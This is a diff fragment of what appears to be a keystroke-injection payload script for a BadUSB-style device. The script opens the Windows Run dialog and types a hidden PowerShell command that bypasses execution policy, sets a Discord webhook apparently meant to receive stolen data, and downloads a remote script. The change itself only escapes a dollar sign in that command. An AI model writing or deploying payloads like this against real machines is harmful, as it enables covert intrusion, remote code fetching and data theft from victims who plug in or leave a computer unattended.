@@ -33,5 +33,5 @@ QUACK DELAY 1500
 QUACK GUI r
 QUACK DELAY 250
 QUACK DELETE
-QUACK STRING powershell -w h -ep bypass $discord='$DISCORD_WEBHOOK';irm $LINK # iex
+QUACK STRING powershell -w h -ep bypass \$discord='$DISCORD_WEBHOOK';irm $LINK # iex
 QUACK ENTER
